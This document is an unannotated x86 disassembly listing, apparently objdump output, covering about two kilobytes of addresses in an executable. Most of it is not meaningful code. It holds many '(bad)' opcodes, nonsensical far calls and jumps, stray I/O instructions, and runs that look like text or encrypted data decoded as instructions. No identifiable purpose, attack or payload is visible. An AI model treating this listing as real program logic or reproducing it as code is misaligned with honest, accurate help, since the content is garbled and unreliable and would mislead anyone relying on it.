  40301b:	addr16 jne 0x402fe9
  40301e:	inc    ebp
  40301f:	inc    ebp
  403020:	inc    ebp
	...
  403029:	add    BYTE PTR [eax],ah
  40302b:	xchg   BYTE PTR [edx-0x1],dl
  40302e:	(bad)  
  40302f:	(bad)  
  403030:	(bad)  
  403031:	(bad)  
  403032:	(bad)  
  403033:	(bad)  
  403034:	(bad)  
  403035:	(bad)  
  403036:	call   0x1be1bf23
  40303b:	xchg   esp,eax
  40303c:	in     eax,0x1c
  40303e:	or     BYTE PTR [edi-0x9],0xe6
  403042:	cmp    eax,0x6dd8fd86
  403047:	dec    eax
  403048:	lods   al,BYTE PTR ds:[esi]
  403049:	inc    eax
  40304a:	inc    eax
  40304b:	mov    bh,0xc7
  40304d:	cmp    al,0x88
  40304f:	retf   
  403050:	call   0xe86e4e3d
  403055:	call   0xe92881d0
  40305a:	add    edx,DWORD PTR [ebx+0x29]
  40305d:	imul   DWORD PTR [ebp-0x38a8a89a]
  403063:	xor    DWORD PTR [eax-0x24],esp
  403066:	mov    BYTE PTR [ecx+ecx*1-0x306f155],cl
  40306d:	iret   
  40306e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40306f:	fwait
  403070:	pusha  
  403071:	dec    edi
  403072:	call   0x636eb877
  403077:	push   ecx
  403078:	add    BYTE PTR [eax],al
  40307a:	add    cl,ah
  40307c:	push   0x3985e3aa
  403081:	push   ebx
  403082:	pop    edi
  403083:	mov    esp,DWORD PTR [eax-0x7765ed74]
  403089:	pop    ebx
  40308a:	push   ebp
  40308b:	xchg   edi,eax
  40308c:	adc    BYTE PTR [eax],bl
  40308e:	ret    
  40308f:	retf   
  403090:	or     ebx,ecx
  403092:	cmp    al,0x95
  403094:	add    eax,0xa79a3dac
  403099:	jb     0x4030b7
  40309b:	cld    
  40309c:	mov    ah,0x8c
  40309e:	add    BYTE PTR [eax],al
  4030a0:	stc    
  4030a1:	pop    edx
  4030a2:	add    BYTE PTR [eax],al
  4030a4:	add    BYTE PTR [ebx-0x74747475],cl
  4030aa:	mov    ecx,DWORD PTR [ebx-0x3f277475]
  4030b0:	(bad)  
  4030b2:	int3   
  4030b3:	int3   
  4030b4:	int3   
  4030b5:	int3   
  4030b6:	int3   
  4030b7:	int3   
  4030b8:	int3   
  4030b9:	int3   
  4030ba:	je     0x403130
  4030bc:	enter  0x6d1,0x56
  4030c0:	fsubp  st(3),st
  4030c2:	es std 
  4030c4:	std    
  4030c5:	mov    ebp,0xfa82de1f
  4030ca:	pop    DWORD PTR [eax-0x7d]
  4030cd:	or     dl,BYTE PTR es:[edi]
  4030d0:	mov    ds:0x742428f7,eax
  4030d5:	je     0x403151
  4030d7:	mov    ch,0xc9
  4030d9:	and    dh,BYTE PTR [eax]
  4030db:	int3   
  4030dc:	pop    esp
  4030dd:	test   BYTE PTR [edx+edx*4-0x64],ch
  4030e1:	pop    edx
  4030e2:	xchg   ebp,eax
  4030e3:	(bad)  
  4030e4:	and    dh,BYTE PTR [eax-0x61]
  4030e7:	fistp  DWORD PTR [edi-0x34]
  4030ea:	and    al,0x23
  4030ec:	nop
  4030ed:	or     esp,eax
  4030ef:	(bad)  
  4030f0:	or     al,0xa7
  4030f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030f3:	je     0x403169
  4030f5:	sub    ch,BYTE PTR [edi+0x4774740b]
  4030fb:	fnstsw WORD PTR [ecx+0x74]
  4030fe:	mov    edx,DWORD PTR [edi-0x47c97c8]
  403104:	(bad)  
  403106:	mov    ch,BYTE PTR ds:0xebaf7
  40310c:	dec    ebp
  40310d:	mov    eax,ds:0xbe46de77
  403112:	jmp    0x495804f3
  403117:	mov    ecx,DWORD PTR [ebx-0x745c7075]
  40311d:	mov    ebp,DWORD PTR [edi]
  40311f:	fisttp DWORD PTR [ebx+0x75758b8b]
  403125:	jne    0x40319c
  403127:	jne    0x40319e
  403129:	jne    0x4031a0
  40312b:	jne    0x4030b8
  40312d:	sbb    al,0xdd
  40312f:	and    ebp,DWORD PTR [ecx+0x47310304]
  403135:	pushf  
  403136:	push   ebp
  403137:	or     al,BYTE PTR [esi-0x36]
  40313a:	pop    esi
  40313b:	or     DWORD PTR [edi+0x7d6b8578],ecx
  403141:	pop    edi
  403142:	das    
  403143:	dec    esi
  403144:	(bad)  
  403145:	(bad)  
  403146:	(bad)  
  403147:	(bad)  
  403148:	(bad)  
  403149:	(bad)  
  40314a:	(bad)  
  40314b:	(bad)  
  40314c:	(bad)  
  40314d:	call   0x1e8da43a
  403152:	mov    ebx,0xf9b2e8e8
  403157:	fdiv   DWORD PTR [ecx]
  403159:	stos   BYTE PTR es:[edi],al
  40315a:	int3   
  40315b:	ja     0x40311e
  40315d:	xchg   esp,edi
  40315f:	fcomp  st(4)
  403161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403162:	xor    DWORD PTR [edi+ebp*1+0x1],ebp
  403166:	push   ss
  403167:	outs   dx,BYTE PTR ds:[esi]
  403168:	ja     0x4031c6
  40316a:	imul   edi,DWORD PTR [edx-0x29],0xe6feb21a
  403171:	das    
  403172:	pop    edi
  403173:	dec    edi
  403174:	mov    ebx,0xe8e96b82
  403179:	call   0xe9283bfc
  40317e:	std    
  40317f:	pop    esp
  403180:	adc    al,0xe8
  403182:	add    bh,al
  403184:	and    eax,0xa584aecf
  403189:	ror    ebp,0xc
  40318c:	nop
  40318d:	ret    0x9b69
  403190:	inc    eax
  403191:	out    0xb6,eax
  403193:	inc    esp
  403194:	imul   ebp,edx,0x2ffb41c7
  40319a:	push   edx
  40319b:	add    BYTE PTR [eax],al
  40319d:	add    ah,ch
  40319f:	push   ds
  4031a0:	and    al,0xd7
  4031a2:	stos   DWORD PTR es:[edi],eax
  4031a3:	int    0x12
  4031a5:	rcr    DWORD PTR [eax],cl
  4031a7:	pop    es
  4031a8:	clc    
  4031a9:	sub    eax,0x8746029b
  4031ae:	push   ecx
  4031af:	stc    
  4031b0:	cmp    al,0x26
  4031b2:	adc    DWORD PTR [ecx+eiz*1+0x15d773d7],esi
  4031b9:	pop    ebp
  4031ba:	lods   al,BYTE PTR ds:[esi]
  4031bb:	add    BYTE PTR [eax],al
  4031bd:	pop    ss
  4031be:	stos   DWORD PTR es:[edi],eax
  4031bf:	das    
  4031c0:	add    BYTE PTR [eax],al
  4031c2:	add    BYTE PTR [ebx-0x74747475],cl
  4031c8:	mov    ecx,DWORD PTR [ebx+0x2d378b8b]
  4031ce:	sbb    al,0x50
  4031d0:	push   eax
  4031d1:	push   eax
  4031d2:	push   eax
  4031d3:	push   eax
  4031d4:	push   eax
  4031d5:	push   eax
  4031d6:	push   eax
  4031d7:	push   eax
  4031d8:	(bad)  
  4031d9:	push   DWORD PTR [ebx*1-0x4a353afa]
  4031e0:	push   edx
  4031e1:	and    al,BYTE PTR [ebp+0x79cbc9c0]
  4031e7:	add    ah,bl
  4031e9:	mov    ebx,0xbde9d8ce
  4031ee:	inc    eax
  4031ef:	(bad)  
  4031f2:	(bad)  
  4031f3:	(bad)  
  4031f4:	cmp    eax,0x87ffff8a
  4031f9:	push   esp
  4031fa:	(bad)  
  4031fb:	(bad)  
  4031fc:	aas    
  4031fd:	sbb    BYTE PTR [ebx-0x2b6aa34d],ah
  403203:	test   DWORD PTR [ebp+0xd9b1a54],edi
  403209:	push   cs
  40320a:	push   eax
  40320b:	lods   al,BYTE PTR ds:[esi]
  40320c:	(bad)  
  40320d:	jle    0x4031d1
  40320f:	mov    al,0xc2
  403211:	xlat   BYTE PTR ds:[ebx]
  403212:	mov    ah,0xfb
  403214:	dec    DWORD PTR [ebx+0x502ade87]
  40321a:	mov    ecx,DWORD PTR [ebx+0x2a6abc8b]
  403220:	int    0x86
  403222:	into   
  403223:	dec    eax
  403224:	pop    ebx
  403225:	mov    dl,cl
  403227:	sub    al,0xb9
  403229:	mov    ecx,0xac4ea805
  40322e:	cli    
  40322f:	andnps xmm2,xmm6
  403232:	int3   
  403233:	push   esp
  403234:	mov    edi,0xf6f7f76f
  403239:	fnsave [esp+edx*2-0x183d9559]
  403240:	mov    ecx,DWORD PTR [ebx-0x7474cf74]
  403246:	mov    eax,DWORD PTR [ebp+0x45]
  403249:	inc    ebp
  40324a:	inc    ebp
  40324b:	inc    ebp
  40324c:	inc    ebp
  40324d:	inc    ebp
  40324e:	inc    ebp
  40324f:	inc    ebp
  403250:	add    al,0x67
  403252:	push   ds
  403253:	(bad)  
  403254:	(bad)  
  403255:	(bad)  
  403256:	(bad)  
  403257:	(bad)  
  403258:	(bad)  
  403259:	(bad)  
  40325a:	(bad)  
  40325b:	inc    DWORD PTR [eax]
  40325d:	add    BYTE PTR [ecx-0x39],cl
  403260:	mov    edi,ebx
  403262:	bound  ecx,QWORD PTR [ebp-0xb]
  403265:	adc    BYTE PTR [edi],0x31
  403268:	lods   al,BYTE PTR ds:[esi]
  403269:	jmp    DWORD PTR ds:0xf6c9d79a
  40326f:	popa   
  403270:	cld    
  403271:	clc    
  403272:	fisubr DWORD PTR [ebp+0x752fc406]
  403278:	and    BYTE PTR [ecx+0x52],ah
  40327b:	and    BYTE PTR gs:[ebp+0x65],ch
  40327f:	ds popa 
  403281:	jb     0x4032f1
  403283:	bound  ebp,QWORD PTR [ebp+0x20]
  403286:	jbe    0x4032f7
  403288:	bound  esp,QWORD PTR [ecx+0x20]
  40328b:	ja     0x4032ee
  40328d:	inc    ebx
  40328e:	or     ch,BYTE PTR [ebp+0x23]
  403291:	jae    0x40329d
  403293:	jp     0x40330b
  403295:	pop    ebx
  403296:	jae    0x4032b8
  403298:	imul   ebp,DWORD PTR [edi],0x6750200d
  40329e:	and    BYTE PTR [ebx+0x20],dh
  4032a1:	jo     0x403304
  4032a3:	arpl   WORD PTR gs:[eax],sp
  4032a6:	gs push edx
  4032a8:	imul   esi,DWORD PTR [edi+0x72],0x4d74206e
  4032af:	ins    DWORD PTR es:[edi],dx
  4032b0:	jae    0x403309
  4032b2:	gs inc ebx
  4032b4:	cs ins DWORD PTR es:[edi],dx
  4032b6:	jae    0x40330a
  4032b8:	bound  esi,QWORD PTR [ebx+0x73]
  4032bb:	and    BYTE PTR gs:[eax+eiz*1],bh
  4032bf:	arpl   WORD PTR [edx],sp
  4032c1:	sub    DWORD PTR [ebx+0x2e],eax
  4032c4:	outs   dx,BYTE PTR ds:[esi]
  4032c5:	and    BYTE PTR cs:[ecx+ebp*2],bh
  4032c9:	bound  esp,QWORD PTR [ebx+0x6f]
  4032cc:	jo     0x403341
  4032ce:	jns    0x40333c
  4032d0:	or     eax,0x720d532e
  4032d5:	ins    DWORD PTR es:[edi],dx
  4032d6:	gs jae 0x403315
  4032d9:	or     eax,0x2e65676d
  4032de:	imul   ebp,DWORD PTR [ebp+0x65],0x20692065
  4032e5:	cmp    ah,BYTE PTR [ebp+0x3d]
  4032e8:	jb     0x403357
  4032ea:	and    BYTE PTR [esi+0x68],cl
  4032ed:	arpl   WORD PTR [ebp+0x73],sp
  4032f0:	add    BYTE PTR [eax],al
  4032f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032f3:	jno    0x40332a
  4032f5:	arpl   WORD PTR [edi],dx
  4032f7:	rcl    DWORD PTR [edx-0x2e],1
  4032fa:	scas   eax,DWORD PTR es:[edi]
  4032fb:	pop    eax
  4032fc:	loopne 0x403305
  4032fe:	icebp  
  4032ff:	inc    esi
  403300:	xchg   ecx,eax
  403301:	push   esp
  403302:	cmc    
  403303:	add    eax,0x961a67ae
  403308:	clc    
  403309:	pop    esp
  40330a:	xchg   ecx,eax
  40330b:	push   0xffffffe3
  40330d:	pop    edi
  40330e:	lock add BYTE PTR [eax],al
  403311:	or     DWORD PTR [edi-0x34],edi
  403314:	add    BYTE PTR [eax],al
  403316:	(bad)  [esi-0x7f]
  403319:	add    BYTE PTR [eax],al
  40331b:	pop    eax
  40331c:	fldenv [ecx+0x4edeba0]
  403322:	cld    
  403323:	ins    BYTE PTR es:[edi],dx
  403324:	inc    ebp
  403325:	repnz cmp BYTE PTR [bx+di-0x30],bl
  40332a:	mov    ebp,0x8aba904
  40332f:	push   DWORD PTR [eax+0x3d]
  403332:	int    0x0
  403334:	add    BYTE PTR [eax],al
  403336:	hlt    
  403337:	stos   BYTE PTR es:[edi],al
  403338:	add    BYTE PTR [eax],al
  40333a:	das    
  40333b:	lock add BYTE PTR [eax],al
  40333e:	add    al,ch
  403340:	call   0xe9291c2d
  403345:	call   0xb61c1c32
  40334a:	cli    
  40334b:	jo     0x4032cf
  40334d:	data16 rcr BYTE PTR [ebp+0x39],1
  403351:	dec    ecx
  403352:	push   0xf3190af9
  403357:	sbb    BYTE PTR [ebx+0x5f],al
  40335a:	lock in al,0x84
  40335d:	out    0x25,eax
  40335f:	out    0x4,al
  403361:	add    al,0x4
  403363:	add    al,0x4
  403365:	add    al,0x4
  403367:	add    al,0x4
  403369:	add    BYTE PTR [eax],al
  40336b:	mov    ds:0xc0d4e7,eax
  403370:	add    cl,cl
  403372:	add    DWORD PTR [edx+0x7d],esp
  403375:	and    al,0xc
  403377:	sbb    BYTE PTR [esi],al
  403379:	call   0xb8a:0xe4ae2542
  403380:	mov    dl,0xbd
  403382:	mov    eax,0x530165b3
  403387:	ins    DWORD PTR es:[edi],dx
  403388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403389:	jecxz  0x403349
  40338b:	xchg   DWORD PTR ds:[ecx+ebp*8-0x61],edx
  403390:	loop   0x4033d0
  403392:	mov    ah,0x42
  403394:	add    BYTE PTR [eax],al
  403396:	je     0x4033f3
  403398:	add    BYTE PTR [eax],al
  40339a:	dec    eax
  40339b:	pop    edx
  40339c:	cwde   
  40339d:	add    BYTE PTR [eax],al
  40339f:	mov    dh,0x6a
  4033a1:	dec    esi
  4033a2:	fneni(8087 only) 
  4033a4:	push   ecx
  4033a5:	fyl2x  
  4033a7:	mov    eax,ds:0x9b011409
  4033ac:	out    dx,eax
  4033ad:	mov    dh,0x33
  4033af:	mov    esp,0x5c3cf719
  4033b4:	jp     0x4033db
  4033b6:	mov    dh,0x0
  4033b8:	add    BYTE PTR [eax],al
  4033ba:	test   al,0x22
  4033bc:	hlt    
  4033bd:	test   DWORD PTR [ebp+0x3c],0x81a98c29
  4033c4:	cwde   
  4033c5:	int    0x26
  4033c7:	test   eax,0xa55e75ad
  4033cc:	out    0xae,al
  4033ce:	aas    
  4033cf:	sbb    eax,0xcd76491
  4033d4:	jmp    0x4033af
  4033d6:	inc    DWORD PTR [eax]
  4033d8:	add    BYTE PTR [eax+ebx*1],dl
  4033db:	popf   
  4033dc:	add    BYTE PTR [eax],al
  4033de:	add    bh,bh
  4033e0:	(bad)  
  4033e1:	(bad)  
  4033e2:	(bad)  
  4033e3:	(bad)  
  4033e4:	(bad)  
  4033e5:	(bad)  
  4033e6:	(bad)  
  4033e7:	inc    DWORD PTR [ebp-0x171735e6]
  4033ed:	call   0xe9291cda
  4033f2:	call   0xd4cbbfdf
  4033f7:	bound  esp,QWORD PTR [ebx]
  4033f9:	push   ecx
  4033fa:	je     0x403438
  4033fc:	push   ebp
  4033fd:	sub    ah,BYTE PTR [ecx+0x6d48d903]
  403403:	jmp    0x403412
  403405:	cmp    DWORD PTR [ebx-0x791ed4bf],esi
  40340b:	sbb    eax,0x8b8bfce1
  403410:	pop    esi
  403411:	cmc    
  403412:	mov    ecx,DWORD PTR [ebx-0x74748716]
  403418:	mov    al,0x15
  40341a:	jp     0x403412
  40341c:	dec    edx
  40341d:	jl     0x403401
  40341f:	mov    ds:0x767ce5a1,eax
  403424:	push   es
  403425:	add    al,BYTE PTR [esi+0x0]
  403428:	inc    ebp
  403429:	icebp  
  40342a:	int3   
  40342b:	jle    0x4033d1
  40342d:	pop    ds
  40342e:	jecxz  0x4033ff
  403430:	mov    ecx,DWORD PTR [ebx+0x46756793]
  403436:	mov    ecx,DWORD PTR [ebx+0x52cb648b]
  40343c:	pop    ecx
  40343d:	shl    bl,0xa2
  403440:	cli    
  403441:	jge    0x40347a
  403443:	popa   
  403444:	jnp    0x4033e3
  403446:	ja     0x4033dd
  403448:	out    dx,al
  403449:	jnp    0x403408
  40344b:	repz inc edx
  40344d:	outs   dx,BYTE PTR ds:[esi]
  40344e:	(bad)  
  40344f:	nop
  403450:	mov    ds:0xe8ce5525,al
  403455:	lods   eax,DWORD PTR ds:[esi]
  403456:	and    al,0xec
  403458:	jl     0x40341b
  40345a:	xor    eax,0xcd8b8b51
  40345f:	test   BYTE PTR [ebx+0x8b8b],0x0
  403466:	add    BYTE PTR [eax],al
  403468:	add    BYTE PTR [eax],al
  40346a:	add    BYTE PTR [eax],al
  40346c:	or     eax,0x8d8d5a7b
  403471:	lea    ecx,[ebp-0x72727273]
  403477:	lea    eax,[eax]
  403479:	add    BYTE PTR ds:0x634d3b81,ah
  40347f:	addr16 lock cmp eax,0x4369b82a
  403486:	cmp    eax,0x1cbc6d7b
  40348b:	push   0x3b
  40348d:	add    edx,DWORD PTR es:[eax]
  403490:	mov    bl,0x22
  403492:	add    BYTE PTR [eax],al
  403494:	pop    ecx
  403495:	xchg   BYTE PTR [esi],bh
  403497:	lahf   
  403498:	sub    BYTE PTR [ebx+ebx*2],bl
  40349b:	push   ebx
  40349c:	jecxz  0x40342f
  40349e:	iret   
  40349f:	adc    esi,ecx
  4034a1:	push   esp
  4034a2:	xchg   edi,eax
  4034a3:	xchg   edi,eax
  4034a4:	into   
  4034a5:	and    DWORD PTR [eax],eax
  4034a7:	test   DWORD PTR [edx-0x1],edi
  4034aa:	push   0xe1946789
  4034af:	leave  
  4034b0:	imul   eax,DWORD PTR [eax],0x0
  4034b3:	xor    BYTE PTR [eax-0x52ffff0d],cl
  4034b9:	cmp    DWORD PTR es:[eax],eax
  4034bc:	call   DWORD PTR [eax-0xb]
  4034bf:	xchg   ebp,eax
  4034c0:	ss push ds
  4034c2:	mov    ch,0x18
  4034c4:	aaa    
  4034c5:	dec    esp
  4034c6:	push   esp
  4034c7:	mov    dh,0x30
  4034c9:	adc    BYTE PTR [edi-0x4f],bh
  4034cc:	adc    BYTE PTR [ebp-0xe],cl
  4034cf:	scas   al,BYTE PTR es:[edi]
  4034d0:	dec    ecx
  4034d1:	jmp    FWORD PTR [eax-0xd0b]
  4034d7:	dec    DWORD PTR [ebp-0x1d0000eb]
  4034dd:	or     bh,bh
  4034df:	(bad)  
  4034e0:	dec    DWORD PTR [ebx-0x74747475]
  4034e6:	mov    ecx,DWORD PTR [ebx+0x3488b8b]
  4034ec:	(bad)  
  4034ee:	loopne 0x403512
  4034f0:	push   ebp
  4034f1:	add    ecx,DWORD PTR [esi+0xe56cd6a]
  4034f7:	fisttp DWORD PTR [eax+0x325f33af]
  4034fd:	sub    BYTE PTR [ebx-0xef0ee1],cl
  403503:	(bad)  
  403504:	(bad)  
  403505:	(bad)  
  403506:	(bad)  
  403507:	(bad)  
  403508:	(bad)  
  403509:	(bad)  
  40350a:	inc    DWORD PTR [eax]
  40350c:	add    bl,cl
  40350e:	xor    DWORD PTR [esi+0x12],ebp
  403511:	add    BYTE PTR [eax],al
  403513:	(bad)  
  403514:	push   cs
  403515:	clc    
  403516:	aad    0x30
  403518:	pop    ds
  403519:	cmp    bl,ah
  40351b:	push   es
  40351c:	mov    ebp,0x74a24f05
  403521:	pop    edx
  403522:	mov    edx,0x8e34e6b4
  403527:	in     al,dx
  403528:	and    edi,eax
  40352a:	and    esi,DWORD PTR [ecx]
  40352c:	cmp    DWORD PTR [bp+si-0x2f44],esi
  403531:	mov    ebp,0x65d4274f
  403536:	add    BYTE PTR [eax],al
  403538:	add    BYTE PTR [ebx+0x0],al
  40353b:	add    BYTE PTR [esi-0x42],bl
  40353e:	push   cs
  40353f:	add    bh,bh
  403541:	mov    ?,WORD PTR [ecx+0x76f63eee]
  403547:	fisttp QWORD PTR ds:0xcf27f324
  40354d:	in     eax,dx
  40354e:	jns    0x403560
  403550:	jmp    0x7c66a3a3
  403555:	test   al,0x5
  403557:	jg     0x4035d2
  403559:	(bad)  
  40355a:	(bad)  
  40355b:	dec    DWORD PTR [edx]
  40355d:	loope  0x4035b7
  40355f:	or     bh,bh
  403561:	outs   dx,DWORD PTR ds:[esi]
  403562:	jmp    0xa794:0xbeb6d2c
  403569:	int    0xe4
  40356b:	inc    edi
  40356c:	adc    dh,BYTE PTR [ecx+edx*1]
  40356f:	(bad)  [esi]
  403571:	lods   al,BYTE PTR ds:[esi]
  403572:	(bad)  
  403573:	int3   
  403574:	cli    
  403575:	das    
  403576:	mov    ecx,0xffffa1c9
  40357b:	ret    0x6637
  40357e:	(bad)  
  40357f:	(bad)  
  403580:	inc    DWORD PTR [eax]
	...
  40358a:	push   eax
  40358b:	mov    al,0x60
  40358d:	int3   
  40358e:	int3   
  40358f:	int3   
  403590:	int3   
  403591:	int3   
  403592:	int3   
  403593:	int3   
  403594:	int3   
  403595:	int3   
  403596:	push   0x6a
  403598:	sbb    edi,DWORD PTR cs:[esi-0xe]
  40359c:	aad    0xfa
  40359e:	xor    al,0x1
  4035a0:	addr16 mov bl,0x79
  4035a3:	retf   
  4035a4:	data16 (bad) 
  4035a7:	or     ebx,DWORD PTR [eax+0x1e]
  4035aa:	fnstcw WORD PTR [ebx]
  4035ac:	pop    es
  4035ad:	std    
  4035ae:	nop
  4035af:	jo     0x40361b
  4035b1:	push   0xfffffff8
  4035b3:	add    al,0x6a
  4035b5:	push   0xffffffb2
  4035b7:	cwde   
  4035b8:	push   0x6a
  4035ba:	jno    0x40358a
  4035bc:	test   al,0xdd
  4035be:	push   ebx
  4035bf:	fstp   st(4)
  4035c1:	push   ebp
  4035c2:	pop    esi
  4035c3:	into   
  4035c4:	and    BYTE PTR [ebx-0x918f776],al
  4035ca:	cmp    ch,al
  4035cc:	dec    esi
  4035cd:	mov    ebx,0x67829348
  4035d2:	push   0x45
  4035d4:	jg     0x4035a1
  4035d6:	scas   al,BYTE PTR es:[edi]
  4035d7:	mov    eax,DWORD PTR [ebp+0x45]
  4035da:	inc    ebp
  4035db:	or     esp,eax
  4035dd:	shr    DWORD PTR [eax],0x7e
  4035e0:	add    BYTE PTR [ecx-0x75],0x3d
  4035e4:	pop    eax
  4035e5:	cdq    
  4035e6:	sbb    al,BYTE PTR [eax+0xb]
  4035e9:	pop    ss
  4035ea:	and    dl,BYTE PTR [ebp+0x2ed982d1]
  4035f0:	out    dx,al
  4035f1:	sar    dl,cl
  4035f3:	sub    BYTE PTR ss:[ebx+0x8fcec94],dh
  4035fa:	xchg   esp,eax
  4035fb:	push   ebp
  4035fc:	adc    esp,edx
  4035fe:	inc    ebp
  4035ff:	inc    ebp
  403600:	les    edi,FWORD PTR [edx]
  403602:	inc    ebp
  403603:	inc    ebp
  403604:	inc    ebp
  403605:	call   0xe9291ef2
  40360a:	call   0x2e291ef7
  40360f:	jo     0x403638
	...
  403619:	add    ah,cl
  40361b:	int3   
  40361c:	hlt    
  40361d:	sti    
  40361e:	dec    esp
  40361f:	and    DWORD PTR [ebx+0x62],ecx
  403622:	inc    edi
  403623:	call   0x8cd001df
  403628:	jbe    0x40361c
  40362a:	repnz retf 0x5adb
  40362e:	mov    ah,0xfd
  403630:	xchg   BYTE PTR [edx+edi*8],bl
  403633:	jecxz  0x403601
  403635:	int3   
  403636:	clc    
  403637:	or     edi,DWORD PTR [edx-0x121d6f9b]
  40363d:	xor    BYTE PTR [eax+0x18efac36],dh
  403643:	jno    0x4035d8
  403645:	pop    es
  403646:	adc    BYTE PTR [eax+ebp*4-0x6c],cl
  40364a:	mov    es,WORD PTR [ebp+edx*2+0x6e]
  40364e:	adc    DWORD PTR [edi+ecx*2-0x1f],edx
  403652:	fmulp  st(4),st
  403654:	int3   
  403655:	pop    ebx
  403656:	call   FWORD PTR [eax-0x34]
  403659:	int3   
  40365a:	ins    BYTE PTR es:[edi],dx
  40365b:	rcr    DWORD PTR [eax+0x159700cc],0x64
  403662:	int    0xe2
  403664:	imul   eax,DWORD PTR [edx],0x57
  403667:	jp     0x4036e2
  403669:	into   
  40366a:	xchg   esi,eax
  40366b:	arpl   sp,ax
  40366d:	es cli 
  40366f:	pop    edx
  403670:	shl    BYTE PTR [ecx+0x3c4e85dd],0xca
  403677:	add    BYTE PTR [eax],al
  403679:	add    BYTE PTR [ebp-0x69],dl
  40367c:	add    BYTE PTR [eax],al
  40367e:	add    edi,DWORD PTR [ebp+0x79000000]
  403684:	outs   dx,BYTE PTR ds:[esi]
  403685:	cs ins DWORD PTR es:[edi],dx
  403687:	gs push esp
  403689:	and    BYTE PTR [ecx+0x65],bh
  40368c:	ins    DWORD PTR es:[edi],dx
  40368d:	je     0x4036be
  40368f:	dec    ebp
  403690:	popa   
  403691:	jbe    0x403702
  403693:	jo     0x403702
  403695:	jb     0x403704
  403697:	jae    0x4036fb
  403699:	jb     0x4036fd
  40369b:	imul   ebp,DWORD PTR [ebp+0x65],0x6376206f
  4036a2:	ins    DWORD PTR es:[edi],dx
  4036a3:	and    BYTE PTR [ebp+0x3c],ch
  4036a6:	inc    ebx
  4036a7:	ins    DWORD PTR es:[edi],dx
  4036a8:	jae    0x40370f
  4036aa:	arpl   WORD PTR [ebp+0x63],bp
  4036ad:	bound  eax,QWORD PTR [ebp+esi*2+0x6d]
  4036b1:	and    bh,BYTE PTR [ecx+0x6f]
  4036b4:	outs   dx,DWORD PTR ds:[esi]
  4036b5:	jo     0x40372d
  4036b7:	jb     0x40372d
  4036b9:	inc    ecx
  4036ba:	and    BYTE PTR [esi+0x41],ah
  4036bd:	jb     0x4036e1
  4036bf:	jbe    0x403706
  4036c1:	gs ins DWORD PTR es:[edi],dx
  4036c3:	popa   
  4036c4:	data16 jae 0x40372c
  4036c7:	das    
  4036c8:	and    al,BYTE PTR [ebp+ebp*2+0x6d]
  4036cc:	jne    0x403730
  4036ce:	je     0x40373e
  4036d0:	or     eax,0x6f746572
  4036d5:	and    BYTE PTR [eax],ah
  4036d7:	sub    al,0x4d
  4036d9:	imul   esp,DWORD PTR [ebp+0x57],0x6d6d2374
  4036e0:	jo     0x40374f
  4036e2:	je     0x403725
  4036e4:	cs jo  0x403707
  4036e7:	jbe    0x403752
  4036e9:	and    BYTE PTR [ecx+0x65],bh
  4036ec:	gs gs popa 
	...
  4036f7:	add    BYTE PTR [ebx+0x3b93acf3],bh
  4036fd:	sbb    DWORD PTR [esi+0x3bff430],ebx
  403703:	and    al,0xeb
  403705:	or     al,0xdc
  403707:	arpl   WORD PTR [esi],bx
  403709:	rcl    BYTE PTR [esi+0x49],1
  40370c:	mov    eax,ds:0xc221b4d
  403711:	or     al,0xc
  403713:	or     al,0xc
  403715:	or     al,0xc
  403717:	or     al,0xc
  403719:	add    BYTE PTR [eax],al
  40371b:	jecxz  0x403786
  40371d:	(bad)  
  40371e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40371f:	add    BYTE PTR [eax],al
  403721:	ja     0x40376b
  403723:	sbb    al,0xf
  403725:	fcmovu st,st(0)
  403727:	adc    eax,0xaa6d30e0
  40372c:	call   0x2e36:0xa1e615b1
  403733:	mov    DWORD PTR ss:[ecx-0x3f2310e],ecx
  40373a:	es dec edi
  40373c:	pop    edi
  40373d:	xchg   edx,eax
  40373e:	sbb    eax,0x26b9533d
  403743:	and    eax,DWORD PTR [eax]
  403745:	add    BYTE PTR [ebx],bl
  403747:	dec    esi
  403748:	add    BYTE PTR [eax],al
  40374a:	ds push 0x65
  40374d:	add    BYTE PTR [ebx+0x763211ff],cl
  403753:	jp     0x4036e6
  403755:	add    di,bx
  403758:	pop    ds
  403759:	inc    edi
  40375a:	mov    edi,0x5264d588
  40375f:	inc    esp
  403760:	mov    ebp,0xe72fe667
  403765:	aas    
  403766:	xchg   BYTE PTR [ebx-0x63307475],cl
  40376c:	add    BYTE PTR [bx+si-0x28],0x8b
  403771:	sub    al,BYTE PTR [eax+0x14]
  403774:	arpl   cx,di
  403776:	mov    WORD PTR fs:[edi],fs
  403779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40377a:	push   ss
  40377b:	in     ax,dx
  40377d:	sub    dh,BYTE PTR [edx-0x39]
  403780:	adc    ecx,DWORD PTR [edx-0x6c5942c2]
  403786:	in     eax,dx
  403787:	mov    ecx,DWORD PTR [ebx-0x747799c8]
  40378d:	mov    ecx,DWORD PTR [ebx+0x0]
  403793:	add    BYTE PTR [eax],al
  403795:	add    BYTE PTR [eax],al
  403797:	add    BYTE PTR [edi+0x15],cl
  40379a:	scas   al,BYTE PTR es:[edi]
  40379b:	jne    0x403812
  40379d:	jne    0x403814
  40379f:	jne    0x403816
  4037a1:	jne    0x403818
  4037a3:	jne    0x4037a9
  4037a5:	add    al,0x25
  4037a7:	int3   
  4037a8:	pop    ebx
  4037a9:	icebp  
  4037aa:	adc    al,0x2
  4037ac:	cmp    al,0xa2
  4037ae:	mov    ds:0xcccae7c6,eax
  4037b3:	pop    esi
  4037b4:	lods   eax,DWORD PTR ds:[esi]
  4037b5:	in     al,dx
  4037b6:	push   esi
  4037b7:	hlt    
  4037b8:	xchg   edi,eax
  4037b9:	call   0xbbe34440
  4037be:	add    al,0x4
  4037c0:	retf   
  4037c1:	loopne 0x4037c7
  4037c3:	add    al,0xbf
  4037c5:	test   BYTE PTR [esp+eax*1],0x93
  4037c9:	ins    DWORD PTR es:[edi],dx
  4037ca:	jmp    0x403773
  4037cc:	rol    DWORD PTR [edi-0xb8bbbd1],1
  4037d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d3:	and    BYTE PTR [ebx+0x1d],al
  4037d6:	jne    0x403813
  4037d8:	xor    eax,0x825e116d
  4037dd:	pop    edi
  4037de:	inc    edi
